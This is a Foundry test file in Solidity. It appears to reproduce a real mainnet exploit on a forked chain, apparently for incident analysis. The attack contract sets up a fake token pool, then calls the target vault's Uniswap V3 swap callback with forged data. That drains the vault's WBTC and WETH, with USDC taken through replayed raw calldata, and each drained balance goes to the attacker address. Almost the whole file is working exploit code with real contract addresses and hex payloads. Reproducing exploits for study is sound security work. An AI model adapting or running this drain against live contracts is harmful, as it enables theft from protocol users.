
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.A;
    uint256 constant FORK_BLOCK = 22157899;
    uint256 constant TX_TIMESTAMP = 1743315671;
    uint256 constant TX_BLOCK_NUMBER = 22157900;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        _runExploit();
    }

    function _runExploit() internal {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack;
        if (ATTACK_CONTRACT != address(0)) {
            _installRuntime();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
        _etchHelpers();
        attack.bindHelper(Addresses.B);
        _expectOutcome(address(attack), Addresses.B);
        _snapProfit();
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _installRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(ATTACK_CONTRACT);
    }

    function _etchHelpers() internal {
        vm.etch(Addresses.B, type(AttackerHelper).runtimeCode);
        vm.allowCheatcodes(Addresses.B);
        _hydrateAttackHelper();
    }

    function _hydrateAttackHelper() internal {
        Harness.vmExt()
            .store(
                Addresses.B,
                bytes32(uint256(0)),
                bytes32(uint256(1337821702718000008706643092967756684847623606640))
            );
        Harness.vmExt()
            .store(
                Addresses.B,
                bytes32(uint256(4)),
                bytes32(uint256(29852648006495581632639394572552351243421167921610457916422658377040103735298))
            );
        Harness.vmExt()
            .store(
                Addresses.B,
                bytes32(uint256(5)),
                bytes32(uint256(29852648006495581632639394572552351243421167921610457916422658377040103735298))
            );
        Harness.vmExt().store(Addresses.B, bytes32(uint256(6)), bytes32(uint256(40)));
    }

    function _expectOutcome(address attack, address helper) internal {
        attack;
        helper;
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.WBTC, "WBTC", 140852920);
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.USDC, "USDC", 17814862676);
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.WETH, "WETH", 119871037891574186422);
        _expectProfit(Addresses.A, attack, Addresses.UNI_V3_POS, "UNI-V3-POS", 1);
    }
}

contract OurAttack {











    AttackerHelper public helper;

    function attack() external payable {
        _attack();
    }

    function _call() internal {}

    function _call2() internal {}

    function _callback() internal {
        _markCallback(2);
    }

    function _callback2() internal {
        _markCallback(3);
    }

    function _callback3() internal {
        _markCallback(4);
    }

    function _callback4() internal {
        _markCallback(5);
    }

    function _getBalance() internal {
        _markCallback(6);
    }

    function _callback5() internal {
        _markCallback(7);
    }

    function _callback6() internal {
        _markCallback(8);
    }

    function _attack() internal {
        {
            address created = Addresses.B;
            require(created.code.length != 0, "replay helper runtime missing");
        }
        AttackerHelper(payable(Addresses.B))._helper();
        AttackerHelper(payable(Addresses.B)).mint(0x88d8762bf324cd0fa5880a69fb6ac8000000000000);
        AttackerHelper(payable(Addresses.B))
            .approve(Addresses.Vault_B91AE2, 0x88d8762bf324cd0fa5880a69fb6ac8000000000000);
        Harness.vmExt()
            .store(
                Addresses.A,
                bytes32(uint256(33692526725841997693424495045153806854254446809251192346024449897421438207750)),
                bytes32(uint256(200000000000000000000000000000000000000000000000000))
            );
        Harness.vmExt()
            .store(
                Addresses.A,
                bytes32(uint256(1)),
                bytes32(uint256(200000000000000000000000000000000000000000000000000))
            );
        Harness.vmExt()
            .store(
                Addresses.A,
                bytes32(uint256(72275821773681943344436761486912684309913394658366297762293008618306348909075)),
                bytes32(uint256(200000000000000000000000000000000000000000000000000))
            );
        IUNI_V3_POS(Addresses.UNI_V3_POS)
            .createAndInitializePoolIfNecessary(
                Addresses.B, address(this), uint24(100), uint160(79228162514264337593543950336)
            );
        AttackerHelper(payable(Addresses.B)).approve(Addresses.UNI_V3_POS, 108823205127466839754387550950703);
        _call();
        IUNI_V3_POS(Addresses.UNI_V3_POS)
            .mint(
                Abi_mint_Param0({
                    field0: Addresses.B,
                    field1: address(this),
                    field2: 100,
                    field3: -190000,
                    field4: 190000,
                    field5: 108823205127466839754387550950703,
                    field6: 108823205127466839754387550957989,
                    field7: 0,
                    field8: 0,
                    field9: address(this),
                    field10: 1743315671
                })
            );
        _call2();
        {
            uint256 swapAmt = 114814730000000000000000000000000000;
            ISwapRouter(Addresses.SwapRouter)
                .exactInputSingle(
                    Abi_exactInputSingle_Param0({
                        field0: address(this),
                        field1: Addresses.B,
                        field2: 100,
                        field3: address(this),
                        field4: 1743315671,
                        field5: swapAmt,
                        field6: 0,
                        field7: 0
                    })
                );
        }
        IVault_B91AE2(Addresses.Vault_B91AE2)
            .initialize(Abi_initialize_Param0({field0: Addresses.B, field1: address(this), field2: 0}));
        uint256 quoterQuoteExactOutputSingleB = IQuoter(Addresses.Quoter)
            .quoteExactOutputSingle(
                Addresses.B, address(this), uint24(100), 114911995060490773496450901025692826, uint160(0)
            );
        IVault_B91AE2(Addresses.Vault_B91AE2)
            .mint(
                true,
                Abi_mint_Param1({field0: Addresses.B, field1: address(this), field2: 0}),
                quoterQuoteExactOutputSingleB,
                uint144(1)
            );
        {
            bytes memory safeCreate2Proof =
                hex"608060405234801561001057600080fd5b50600080546001600160a01b031916321790556102f2806100326000396000f3fe608060405234801561001057600080fd5b50600436106100415760003560e01c806311b92ab914610046578063d6d2b6ba1461005b578063e086e5ec1461006e575b600080fd5b61005961005436600461020d565b610076565b005b61005961006936600461020d565b6100ff565b61005961016d565b6000546001600160a01b0316321461008d57600080fd5b6000836001600160a01b031683836040516100a9929190610276565b6000604051808303816000865af19150503d80600081146100e6576040519150601f19603f3d011682016040523d82523d6000602084013e6100eb565b606091505b50509050806100f957600080fd5b50505050565b6000546001600160a01b0316321461011657600080fd5b6000836001600160a01b03168383604051610132929190610276565b600060405180830381855af49150503d80600081146100e6576040519150601f19603f3d011682016040523d82523d6000602084013e6100eb565b6000546001600160a01b0316321461018457600080fd5b60405132904780156108fc02916000818181858888f193505050501580156101b0573d6000803e3d6000fd5b50565b80356101be816102a8565b92915050565b60008083601f8401126101d657600080fd5b50813567ffffffffffffffff8111156101ee57600080fd5b60208301915083600182028301111561020657600080fd5b9250929050565b60008060006040848603121561022257600080fd5b600061022e86866101b3565b935050602084013567ffffffffffffffff81111561024b57600080fd5b610257868287016101c4565b92509250509250925092565b600061027083858461029c565b50500190565b6000610283828486610263565b949350505050565b60006001600160a01b0382166101be565b82818337506000910152565b6102b18161028b565b81146101b057600080fdfea26469706673582212206248366d18b20b1f2aadb961f5564f10ba9323e8fa7413f070e5cbc150a2d0b064736f6c63430008040033";
            IContract_000000_9497(Addresses.A_000000_9497)
                .safeCreate2(
                    bytes32(hex"0000000000000000000000000000000000000000d739dcf6ae98b123e5650020"), safeCreate2Proof
                );
        }
        IERC20Like(Addresses.USDC).balanceOf(Addresses.Vault_B91AE2);
        {
            bytes memory replayCallData =
                hex"11b92ab9000000000000000000000000b91ae2c8365fd45030aba84a4666c4db074e53e700000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000224fa461e3300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000425d93b54000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000001a0000000000000000000000000ea55fffae1937e47eba2d854ab7bd29a9cc29170000000000000000000000000ea55fffae1937e47eba2d854ab7bd29a9cc29170000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000ea55fffae1937e47eba2d854ab7bd29a9cc2917000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000";
            (bool ok,) = Addresses.A_000000_4281.call(replayCallData);
            require(ok, "replay selector 0x11b92ab9 failed");
        }
        IERC20Like(Addresses.USDC).balanceOf(Addresses.A_000000_4281);
        {
            bytes memory replayCallData =
                hex"11b92ab9000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb4800000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000044a9059cbb00000000000000000000000027defcfa6498f957918f407ed8a58eba2884768c0000000000000000000000000000000000000000000000000000000425d93b5400000000000000000000000000000000000000000000000000000000";
            (bool ok,) = Addresses.A_000000_4281.call(replayCallData);
            require(ok, "replay selector 0x11b92ab9 failed");
        }
        uint256 wbtcBalanceOfVaultB91ae2 = IERC20Like(Addresses.WBTC).balanceOf(Addresses.Vault_B91AE2);
        {
            bytes memory uniswapV3SwapCallbackProof = abi.encode(
                address(this),
                address(this),
                Addresses.WBTC,
                address(this),
                Addresses.ZERO,
                Addresses.ZERO,
                Addresses.ZERO,
                Addresses.ZERO,
                Addresses.ZERO,
                Addresses.ZERO,
                Addresses.ZERO,
                Addresses.ZERO,
                uint256(1)
            );
            IVault_B91AE2(Addresses.Vault_B91AE2)
                .uniswapV3SwapCallback(int256(0), int256(wbtcBalanceOfVaultB91ae2), uniswapV3SwapCallbackProof);
        }
        uint256 wbtcBalanceOfA = IERC20Like(Addresses.WBTC).balanceOf(address(this));
        IERC20Like(Addresses.WBTC).transfer(Addresses.attacker_eoa, wbtcBalanceOfA);
        uint256 wethBalanceOfVaultB91ae2 = IERC20Like(Addresses.WETH).balanceOf(Addresses.Vault_B91AE2);
        {
            bytes memory uniswapV3SwapCallbackProof = abi.encode(
                address(this),
                address(this),
                Addresses.WETH,
                address(this),
                Addresses.ZERO,
                Addresses.ZERO,
                Addresses.ZERO,
                Addresses.ZERO,
                Addresses.ZERO,
                Addresses.ZERO,
                Addresses.ZERO,
                Addresses.ZERO,
                uint256(1)
            );
            IVault_B91AE2(Addresses.Vault_B91AE2)
                .uniswapV3SwapCallback(int256(0), int256(wethBalanceOfVaultB91ae2), uniswapV3SwapCallbackProof);
        }
        uint256 wethBalanceOfA = IERC20Like(Addresses.WETH).balanceOf(address(this));
        IERC20Like(Addresses.WETH).transfer(Addresses.attacker_eoa, wethBalanceOfA);
    }

    receive() external payable {}

    function balanceOf(address account) external view returns (uint256) {
        uint256 live = _tokenBal(account);
        if (live != 0) return live;
        return 0;
    }

    function approve(address spender, uint256 allowance) external payable {
        spender;
        allowance;
        {
            uint256 arg0;
            assembly { arg0 := calldataload(4) }
            if (address(uint160(arg0)) == 0xC36442b4a4522E871399CD717aBDD847Ab11FE88) {
                _call();
                bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000001";
                assembly { return(add(ret, 32), mload(ret)) }
            }
        }
        {
            uint256 arg0;
            assembly { arg0 := calldataload(4) }
            if (address(uint160(arg0)) == 0xE592427A0AEce92De3Edee1F18E0157C05861564) {
                _call2();
                bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000001";
                assembly { return(add(ret, 32), mload(ret)) }
            }
        }
        _call();
        bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000001";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function transferFrom(address from, address to, uint256 amount) external payable {
        from;
        to;
        amount;
        if (msg.sender == 0xC36442b4a4522E871399CD717aBDD847Ab11FE88) {
            _callback();
            _recXferFrom();
            bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000001";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (msg.sender == 0xE592427A0AEce92De3Edee1F18E0157C05861564) {
            _callback2();
            _recXferFrom();
            bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000001";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        _callback();
        _recXferFrom();
        bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000001";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function symbol() external payable {
        bytes memory ret =
            abi.encode(_uintArray1(29400335157912315244266070412362164103369332044010299463143527189509193072640));
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function transfer(address recipient, uint256 amount) external payable {
        recipient;
        amount;
        _callback6();
        _recXfer();
        bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000001";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    fallback() external payable {
        if (msg.sig == 0x313ce567) {
            bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000028";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (msg.sig == 0x6bc601d7) {
            bytes memory ret = abi.encode(
                uint256(10000000000),
                uint256(0),
                uint256(0),
                uint256(0),
                uint256(0),
                uint256(0),
                0xeA55fFFAe1937E47eBA2D854ab7bd29a9CC29170
            );
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (msg.sig == 0x70a08231) {
            bytes memory ret = _balanceRet(hex"0000000000000000000000000000000000000000000000000000000000000000");
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (msg.sig == 0xcb01c553) {
            _attack();
            return;
        }
        _entryCb();
    }

    function _entryCb() internal {}

    function bindHelper(address attackHelper) external {
        helper = AttackerHelper(payable(attackHelper));
    }

    function _boundAttack(bytes memory data) internal {
        _decodedCall(address(helper), data);
    }

    function _decodedCall(address target, bytes memory data) internal {
        (bool ok,) = target.call(data);
        require(ok, "helper dispatch failed");
    }

    mapping(bytes4 => uint256) private _dispatchCursor;
    mapping(uint256 => bool) private _callbackSeenFlag;
    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _tokenBalanceLedger;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextDispatch(bytes4 selector) internal returns (uint256 ordinal) {
        ordinal = _dispatchCursor[selector];
        _dispatchCursor[selector] = ordinal + 1;
    }

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _markCallback(uint256 index) internal {
        _callbackSeenFlag[index] = true;
    }

    function _tokenBal(address account) internal view returns (uint256) {
        return _tokenBalanceLedger[account];
    }

    function _setTokenBal(address account, uint256 amount) internal {
        _tokenBalanceLedger[account] = amount;
    }

    function _recordBalancerFlash(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerFlashLoanPreBalances(address[] memory tokens) external {
        _recordBalancerFlash(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _balanceRet(bytes memory replayRet) internal view returns (bytes memory) {
        address account;
        assembly { account := calldataload(4) }
        uint256 live = _tokenBal(account);
        if (live != 0) return abi.encode(live);
        return replayRet;
    }

    function _recXfer() internal {
        address to;
        uint256 amount;
        assembly {
            to := calldataload(4)
            amount := calldataload(36)
        }
        _setTokenBal(to, _tokenBal(to) + amount);
    }

    function _recXferFrom() internal {
        address from;
        address to;
        uint256 amount;
        assembly {
            from := calldataload(4)
            to := calldataload(36)
            amount := calldataload(68)
        }
        if (_tokenBal(from) >= amount) _setTokenBal(from, _tokenBal(from) - amount);
        _setTokenBal(to, _tokenBal(to) + amount);
    }

    function _uintArray1(uint256 a0) internal pure returns (uint256[] memory out) {
        out = new uint256[](1);
        out[0] = a0;
    }
}

contract AttackerHelper {
    receive() external payable {}

    function balanceOf(address account) external view returns (uint256) {
        uint256 live = _tokenBal(account);
        if (live != 0) return live;
        return 0;
    }

    function symbol() external pure returns (string memory) {
        return "POC_HELPER";
    }

    function decimals() external pure returns (uint8) {
        return 18;
    }

    function approve(address spender, uint256 allowance) external payable {
        spender;
        allowance;
        {
            uint256 arg0;
            assembly { arg0 := calldataload(4) }
            if (address(uint160(arg0)) == 0xB91AE2c8365FD45030abA84a4666C4dB074E53E7) {
                _helperCb();
                bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000001";
                assembly { return(add(ret, 32), mload(ret)) }
            }
        }
        {
            uint256 arg0;
            assembly { arg0 := calldataload(4) }
            if (address(uint160(arg0)) == 0xC36442b4a4522E871399CD717aBDD847Ab11FE88) {
                _helperCb2();
                bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000001";
                assembly { return(add(ret, 32), mload(ret)) }
            }
        }
        _helperCb();
        bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000001";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function transferFrom(address from, address to, uint256 amount) external payable {
        from;
        to;
        amount;
        uint256 dispatchOrdinal = _nextDispatch(0x23b872dd);
        if (dispatchOrdinal == 0) {
            _helperCb3();
            _recXferFrom();
            bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000001";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (dispatchOrdinal == 1) {
            _helperCb4();
            _recXferFrom();
            bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000001";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        _helperCb3();
        _recXferFrom();
        bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000001";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function mint(uint256 amount) external payable {
        amount;
        _helperCb6();
        return;
    }

    function transfer(address recipient, uint256 amount) external payable {
        recipient;
        amount;
        _helperCb7();
        _recXfer();
        bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000001";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    fallback() external payable {
        _entryCb();
    }

    function helperCb6() external payable {
        _helperCb6();
        return;
    }

    function helperCb7() external payable {
        _helperCb7();
        _recXfer();
        bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000001";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function helperCb() external payable {
        _helperCb();
        bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000001";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function helperCb2() external payable {
        _helperCb2();
        bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000001";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function helperCb3() external payable {
        _helperCb3();
        _recXferFrom();
        bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000001";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function helperCb4() external payable {
        _helperCb4();
        _recXferFrom();
        bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000001";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function _entryCb() internal {}

    mapping(bytes4 => uint256) private _dispatchCursor;
    mapping(uint256 => bool) private _callbackSeenFlag;
    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _tokenBalanceLedger;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextDispatch(bytes4 selector) internal returns (uint256 ordinal) {
        ordinal = _dispatchCursor[selector];
        _dispatchCursor[selector] = ordinal + 1;
    }

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _markCallback(uint256 index) internal {
        _callbackSeenFlag[index] = true;
    }

    function _tokenBal(address account) internal view returns (uint256) {
        return _tokenBalanceLedger[account];
    }

    function _setTokenBal(address account, uint256 amount) internal {
        _tokenBalanceLedger[account] = amount;
    }

    function _recordBalancerFlash(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerFlashLoanPreBalances(address[] memory tokens) external {
        _recordBalancerFlash(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _balanceRet(bytes memory replayRet) internal view returns (bytes memory) {
        address account;
        assembly { account := calldataload(4) }
        uint256 live = _tokenBal(account);
        if (live != 0) return abi.encode(live);
        return replayRet;
    }

    function _recXfer() internal {
        address to;
        uint256 amount;
        assembly {
            to := calldataload(4)
            amount := calldataload(36)
        }
        _setTokenBal(to, _tokenBal(to) + amount);
    }

    function _recXferFrom() internal {
        address from;
        address to;
        uint256 amount;
        assembly {
            from := calldataload(4)
            to := calldataload(36)
            amount := calldataload(68)
        }
        if (_tokenBal(from) >= amount) _setTokenBal(from, _tokenBal(from) - amount);
        _setTokenBal(to, _tokenBal(to) + amount);
    }

    function _uintArray1(uint256 a0) internal pure returns (uint256[] memory out) {
        out = new uint256[](1);
        out[0] = a0;
    }

    function _helperCb() internal {}

    function _helperCb2() internal {}

    function _helperCb3() internal {}

    function _helperCb4() internal {}

    function _helperCb6() internal {}

    function _helperCb7() internal {}

    function _helper() public {}
}

contract Forwarder {
    receive() external payable {}

    function callFunc(address target, bytes calldata data) external payable {
        (bool ok, bytes memory ret) = target.call{value: msg.value}(data);
        if (!ok) {
            assembly { revert(add(ret, 32), mload(ret)) }
        }
    }
}

interface IERC20Like {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
    function transfer(address to, uint256 amount) external;
    function transferFrom(address from, address to, uint256 amount) external;
}

interface IWETHLike {
    function deposit() external payable;
}

library ArrayGuard {
    function capWithReserve(uint256 wanted, address token, address holder, uint256 reserve)
        internal
        view
        returns (uint256)
    {
        uint256 available = IERC20Like(token).balanceOf(holder);
        if (available > reserve) available -= reserve;
        else available = 0;
        return wanted > available ? available : wanted;
    }
}

interface IERC721Like {
    function ownerOf(uint256 tokenId) external view returns (address);
    function getApproved(uint256 tokenId) external view returns (address);
    function isApprovedForAll(address owner, address operator) external view returns (bool);
    function transferFrom(address from, address to, uint256 tokenId) external;
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
}

interface IUniswapV2PairLike {
    function mint(address to) external returns (uint256 liquidity);
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
    function skim(address to) external;
    function sync() external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IMulticallLike {
    function multicall(bytes[] calldata data) external returns (bytes[] memory results);
}

struct AttackCall {
    address target;
    bytes data;
}

interface VmExt {
    function store(address target, bytes32 slot, bytes32 value) external;
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant A_000000_4281 = 0x00000000001271551295307aCC16bA1e7E0d4281;
    address internal constant A_000000_9497 = 0x0000000000FFe8B47B3e2130213B802212439497;
    address internal constant UniswapV3Factory = 0x1F98431c8aD98523631AE4a59f267346ea31F984;
    address internal constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address internal constant attacker_eoa = 0x27dEfcFA6498F957918F407Ed8A58Eba2884768c;
    address internal constant B = 0x341c853c09b3691b434781078572f9d3ab9E3CBB;
    address internal constant APE_21 = 0x3753c7d80FB332D88b26758d11a5D3Ab7a4aFCd7;
    address internal constant A_3CDCCF_BB29 = 0x3CDCCFA37c1B2BEe3d810eC9dAddbB205048bB29;
    address internal constant FiatTokenV2_2 = 0x43506849D7C04F9138D1A2050bbF3A0c054402dd;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant Quoter = 0xb27308f9F90D607463bb33eA1BeBb41C27CE5AB6;
    address internal constant Vault_B91AE2 = 0xB91AE2c8365FD45030abA84a4666C4dB074E53E7;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant UNI_V3_POS = 0xC36442b4a4522E871399CD717aBDD847Ab11FE88;
    address internal constant UniswapV3Pool = 0xE4C684F944b26b21167ef5a25F52311Ab7822831;
    address internal constant SwapRouter = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
    address internal constant A = 0xeA55fFFAe1937E47eBA2D854ab7bd29a9CC29170;
}

struct Abi_mint_Param0 {
    address field0;
    address field1;
    uint24 field2;
    int24 field3;
    int24 field4;
    uint256 field5;
    uint256 field6;
    uint256 field7;
    uint256 field8;
    address field9;
    uint256 field10;
}

struct Abi_exactInputSingle_Param0 {
    address field0;
    address field1;
    uint24 field2;
    address field3;
    uint256 field4;
    uint256 field5;
    uint256 field6;
    uint160 field7;
}

struct Abi_initialize_Param0 {
    address field0;
    address field1;
    int8 field2;
}

struct Abi_mint_Param1 {
    address field0;
    address field1;
    int8 field2;
}

interface IB {
    function mint(uint256) external;
}

interface IContract_000000_9497 {
    function safeCreate2(bytes32, bytes calldata) external returns (uint256);
}

interface IQuoter {
    function quoteExactOutputSingle(address, address, uint24, uint256, uint160) external returns (uint256);
}

interface ISwapRouter {
    function exactInputSingle(Abi_exactInputSingle_Param0 calldata) external returns (uint256);
}

interface IUNI_V3_POS {
    function createAndInitializePoolIfNecessary(address, address, uint24, uint160) external returns (uint256);
    function mint(Abi_mint_Param0 calldata) external;
}

interface IVault_B91AE2 {
    function initialize(Abi_initialize_Param0 calldata) external;
    function mint(bool, Abi_mint_Param1 calldata, uint256, uint144) external returns (uint256);
    function uniswapV3SwapCallback(int256, int256, bytes calldata) external;
}

library Harness {
    function vmExt() internal pure returns (VmExt) {
        return VmExt(address(uint160(uint256(keccak256("hevm cheat code")))));
    }

    function safeBalance(address token, address account) internal view returns (uint256) {
        if (token.code.length == 0) return 0;
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSignature("balanceOf(address)", account));
        if (!ok || data.length < 32) return 0;
        return abi.decode(data, (uint256));
    }
}
